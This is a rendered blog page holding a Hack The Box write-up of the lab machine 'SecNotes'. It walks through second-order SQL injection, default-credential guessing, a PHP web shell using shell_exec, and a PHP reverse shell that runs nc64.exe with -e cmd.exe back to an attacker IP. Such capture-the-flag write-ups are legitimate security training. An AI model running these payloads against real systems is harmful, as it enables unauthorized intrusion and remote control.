@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/HTB-Writeups/secnotes/">
+  <meta property="og:site_name" content="www.tagnull.de">
+  <meta property="og:title" content="SecNotes - WriteUp">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2019-01-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-01-19T00:00:00+00:00">
+<title>SecNotes - WriteUp | www.tagnull.de</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/logo.png" >
+<link rel="canonical" href="//localhost:1313/docs/HTB-Writeups/secnotes/">
+<link rel="stylesheet" href="/book.min.3c7b77c63a1cc74e1edaf2f2784e37d45fc454212fd35d3fd634a05f7bc705d6.css" integrity="sha256-PHt3xjocx04e2vLyeE431F/EVCEv010/1jSgX3vHBdY=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.83bebab3890c5924fa66cd1ecb2c80beb86c0f933407ef59e20082e8b8f51813.js" integrity="sha256-g766s4kMWST6Zs0eyyyAvrhsD5M0B&#43;9Z4gCC6Lj1GBM=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Cheatsheet</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
+    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
+      <a role="button" class="">Enumeration</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/network/" class="">network</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/Cheatsheet/enumeration/web/" class="">web</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
+    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
+      <a role="button" class="">Active Directory</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f1c85964cb4e1e3e13dfaf4558a33249" class="toggle" checked />
+    <label for="section-f1c85964cb4e1e3e13dfaf4558a33249" class="flex justify-between">
+      <a role="button" class="">HTB Writeups</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/bountyhunter/" class="">BountyHunter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/cap/" class="">Cap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/the-notebook/" class="">The Notebook</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/ret2plt-exploit/" class="">Exploit-Development - ret2plt</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/safe/" class="">Safe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/fortune/" class="">Fortune</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/onetwoseven/" class="">OneTwoSeven</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/querier/" class="">Querier</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/irked/" class="">Irked</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/stratosphere/" class="">Stratosphere</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/access/" class="">Access</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/ypuffy/" class="">Ypuffy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/HTB-Writeups/secnotes/" class="active">SecNotes - WriteUp</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle"  />
+    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
+      <a role="button" class="">OSCP</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/OSCP/oscp-reporting/" class="">Path to OSCP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/OSCP/oscp-exploitdev/" class="">Path to OSCP - Exploit Development</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/OSCP/oscp-review/" class="">Path to OSCP - Review</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>SecNotes - WriteUp</strong>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><hr>
+<h1 id="external-recon">
+  External Recon
+  <a class="anchor" href="#external-recon">#</a>
+</h1>
+<p>As usual we start with our nmap scan and see what we are dealing with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV 10.10.10.97
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds Windows <span style="color:#ae81ff">10</span> Enterprise <span style="color:#ae81ff">17134</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: HTB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
+</span></span><span style="display:flex;"><span>| smb-os-discovery:
+</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">10</span> Enterprise <span style="color:#ae81ff">17134</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">10</span> Enterprise 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_10::-
+</span></span><span style="display:flex;"><span>|   Computer name: SECNOTES
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: SECNOTES<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: HTB<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2019-01-04T05:21:46-08:00
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2.02:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2019-01-04 14:21:48
+</span></span><span style="display:flex;"><span>|_  start_date: N/A</span></span></code></pre></div>
+<p>So Port 80 &amp; 445 are open. While I explored those, I scanned all TCP Ports to see if
+there&rsquo;s more to find. Nmap by default just checks the Top1000.</p>
+<p>Spoileralert: I found Port 8808 to be open also.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="explore">
+  Explore
+  <a class="anchor" href="#explore">#</a>
+</h1>
+<h5 id="port-445">
+  Port 445
+  <a class="anchor" href="#port-445">#</a>
+</h5>
+<p>Nothing too interessting.</p>
+<h5 id="port-8808">
+  Port 8808
+  <a class="anchor" href="#port-8808">#</a>
+</h5>
+<p>Just the default IIS Webserver Page. Nothing fancy here.</p>
+<h5 id="port-80">
+  Port 80
+  <a class="anchor" href="#port-80">#</a>
+</h5>
+<p>We find a login page. I first tried to login with the usual supects.</p>
+<p>
+  <img src="SecNotes-Login.png" alt="Login" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin:admin
+</span></span><span style="display:flex;"><span>admin:toor
+</span></span><span style="display:flex;"><span>root:toor
+</span></span><span style="display:flex;"><span>etc.</span></span></code></pre></div>
+<p>No luck so far. But if you look closely, there&rsquo;s an option to register an account.
+Let&rsquo;s try that.</p>
+<p>
+  <img src="SecNotes-SignUp.png" alt="SignUp" /></p>
+<p>That worked - let&rsquo;s login.</p>
+<p>
+  <img src="SecNotes-LoggedInAsUser.png" alt="LoggedInAsUser" /></p>
+<p>We see a page where we are able to take up to 3 notes and store them and also delete them.
+Also we get another piece of intel. Can you spot it? Take your time and try to find it.</p>
+<p>Correct it&rsquo;s the name &ldquo;tyler&rdquo; in the email-address. Perhaps this could be usefull later.</p>
+<p>I checked all the functions the site had to offer, and noticed this URL when deleting a note:</p>
+<p><code>http://10.10.10.97/home.php?action=delete&amp;id=31</code></p>
+<p>We can see the &ldquo;home.php&rdquo; script has a parameter to offer. I started playing with it.
+With &ldquo;wfuzz&rdquo; to find other parameters but had no luck finding a vulnerability there.</p>
+<p>So I started up &ldquo;gobuster&rdquo; and found a file called &ldquo;db.php&rdquo;. Based on the name &ldquo;db&rdquo; is assumed
+that all our notes are stored in a database.</p>
+<p>As there was nothing else I could find, I thought maybe some kind of &ldquo;SQLi&rdquo; is possible.
+Although I am not very experienced with &ldquo;SQLi&rdquo; I jumped right in and fired up &ldquo;SQLMap&rdquo;.</p>
+<p>I won&rsquo;t give you all the things I tried. I spent at least and hour or two but nothing came up.
+So I was stuck. After checking the HackTheBox forums for a hint, someone mentioned that his type
+of vulnerability was part of a retired box called &ldquo;nightmare&rdquo;.</p>
+<p>I had the video-solution of &ldquo;nightmare&rdquo;, created by the awesome guy &ldquo;ippsec&rdquo;, already downloaded on my laptop.
+So I watched it again just to learn it was indeed about &ldquo;SQLi&rdquo;. Specificaly &ldquo;2nd order SQLi&rdquo;.
+You should watch (and subscribe!) his video for a better explaination on this type of &ldquo;SQLi&rdquo;.</p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/frh-jYaUvrU?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+<p>So let&rsquo;s try some handcrafted &ldquo;SQLi&rdquo;.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="weaponize">
+  Weaponize
+  <a class="anchor" href="#weaponize">#</a>
+</h1>
+<p>So, we could login with our regular user. First, let&rsquo;s logout and create another user like so:</p>
+<p>
+  <img src="SecNotes-SQLi-Test.png" alt="SQLi-Test" /></p>
+<p>After logging in we get an error!</p>
+<p>
+  <img src="SecNotes-500Error.png" alt="500Error" /></p>
+<p>Which means, something broke because of the single-quote we had in our username. Let&rsquo;s try to fix that.
+I commented everything out after the quote.</p>
+<p>
+  <img src="SecNotes-SQLi-2.png" alt="SQLi2" /></p>
+<p>Nice - we are able to login again. But wait, something is wrong here:</p>
+<p>
+  <img src="SecNotes-SQLi-Success.png" alt="SQLi-Success" /></p>
+<p>We can see the note from the legitmate &ldquo;x41&rdquo; User. We can read other users content!</p>
+<p>This works because the &ldquo;SQL&rdquo; query to get the notes from the database looks probably like this:</p>
+<p><code>select * from NOTES where USERNAME like '$User'</code></p>
+<p>Keep those two single-quotes in mind.</p>
+<p>Our &ldquo;SQLi&rdquo; did this to the statement:</p>
+<p><code>select * from NOTES where USERNAME like 'x41'-- -'</code></p>
+<p>As you can see, there are now three single-quotes. The 2nd one was part of the name we
+provided. But as we commented the original one out, we have now a valid statement with
+the already existing useraccount &ldquo;x41&rdquo; (without the single-quote).</p>
+<p>Nice! You know what we need to do next, do you?! ;)</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="exploit">
+  Exploit
+  <a class="anchor" href="#exploit">#</a>
+</h1>
+<p>Let&rsquo;s create another user, hmm, let&rsquo;s target &ldquo;tyler&rdquo; as he seems to be an admin of some sorts.</p>
+<p>
+  <img src="SecNotes-SQLi-Tyler.png" alt="SQLi-Tyler" /></p>
+<p>And after logging in we find something nice in his notes. :)</p>
+<p>
+  <img src="SecNotes-Tyler-Creds.png" alt="Tyler-Creds" /></p>
+<p>Now we can try to connect to the SMB share with those credentials.</p>
+<p>And there&rsquo;s the webroot the IIS Server.</p>
+<p>
+  <img src="SecNotes-SMB-Share.png" alt="SMB-Share" /></p>
+<p>The note says, this is supposed to be the new website.
+The old one is based on &ldquo;php&rdquo;. Perhaps PHP is working on there too?</p>
+<p>I uploaded a simple &ldquo;php&rdquo; command-shell and tried it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;fexec&#39;</span>])) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">shell_exec</span>($_REQUEST[<span style="color:#e6db74">&#39;fexec&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div>
+<p>
+  <img src="SecNotes-RCE.png" alt="RCE" /></p>
+<p>=) Let&rsquo;s get a reverse-shell!</p>
+<p>At first I used &ldquo;nc.exe&rdquo;, but soon remembered it&rsquo;s a Windows 10 box, running a 64Bit OS.
+If you start a 32Bit executable on a 64Bit OS, you get a different environment. A different registry and
+some programs won&rsquo;t work. So I switched to &ldquo;nc64.exe&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Cyber PewPew&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  $last_command <span style="color:#f92672">=</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;nc64.exe 10.10.15.140 4445 -e cmd.exe&#39;</span>,$ret);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> $last_command;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> ------------------------------- </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> $ret;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div>
+<p>
+  <img src="SecNotes-RevShell.png" alt="RevShell" /></p>
+<p>We&rsquo;ve got a shell AND&hellip;.</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="user-flag">
+  User Flag
+  <a class="anchor" href="#user-flag">#</a>
+</h1>
+<p>&hellip;sure enough &ldquo;user.txt&rdquo;! :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\n</span>ew-site&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>secnotes<span style="color:#ae81ff">\t</span>yler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>yler<span style="color:#ae81ff">\D</span>esktop&gt;dir
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>yler<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>08/19/2018  08:25 AM                <span style="color:#ae81ff">34</span> user.txt</span></span></code></pre></div>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="internal-recon">
+  Internal Recon
+  <a class="anchor" href="#internal-recon">#</a>
+</h1>
+<p>While searching around on the box to find clues on the next step to <code>root.txt</code>,
+I noticed an &ldquo;Ubuntu&rdquo; archive and a &ldquo;Distros&rdquo; folder. I remember wondering &ldquo;Why is this stuff here?&rdquo;
+But didn&rsquo;t put 1 + 1 together.</p>
+<p>I had to go back to the forums again to seek out for help. Where someone said:</p>
+<p>&ldquo;What OS Version have you found - there&rsquo;s a specific new feature in this.&rdquo;</p>
+<p>Because I couldn&rsquo;t think about anything from the top of my head, I googled for the releasenotes.
+And then it just starred at me:</p>
+<p align="center">
+<b>"Windows Subsystem for Linux"</b>
+</p>
+<p>I spent about an hour or so just to learn about this feature, and the tools around it.
+After that I used &ldquo;wsl.exe&rdquo; and &ldquo;wsl.config&rdquo; to start up the preconfigued &ldquo;Ubuntu&rdquo; Machine.</p>
+<p>Hoping for a quick win for root. Perhaps I can read the Windows filesystem from it without
+&ldquo;ACLs&rdquo; messing with me?</p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="anchor" href="#privilege-escalation">#</a>
+</h1>
+<p>&ldquo;Sadly&rdquo; that wasn&rsquo;t possible.
+I had to search a lot, after a little nudge I headed into the right direction.
+I just failed to stick to my routine. I guessed my next step instead of doing internal recon properly.</p>
+<p>If I had done it, I immediately would have tried this:</p>
+<p>
+  <img src="SecNotes-AdminPW.png" alt="AdminPW" /></p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="root-flag">
+  Root Flag
+  <a class="anchor" href="#root-flag">#</a>
+</h1>
+<p>From here it just was connecting to the SMB share to get the root flag.
+I didn&rsquo;t bother getting a propper shell as admin, which I leave up to the reader how
+to do that. ;) (Hint: Impacket)</p>
+<p>
+  <img src="SecNotes-root.txt.png" alt="Root.txt" /></p>
+<p>
+  <a href="/#top">[Top]</a></p>
+<h1 id="lessons-learned">
+  Lessons Learned
+  <a class="anchor" href="#lessons-learned">#</a>
+</h1>
+<p>First, my &ldquo;Enumeration&rdquo; failed me and I didn&rsquo;t followed my initial thoughts about the Ubuntu folders.
+On the other hand I got the &ldquo;SQLi&rdquo; right, found the hint about &ldquo;tyler&rdquo; right away. And I learned
+about &ldquo;wsl&rdquo;. Which is a difficult thing to monitor for &ldquo;blueteams&rdquo;.</p>
+<p>While researching this feature I discovered this video from Checkpoint.
+I recommend watching it.</p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/fwEQFMbHIV8?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+<br>
+That's it for today. Have a nice one!
+<br>
+x41
+<p>
+  <a href="/#top">[Top]</a></p></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
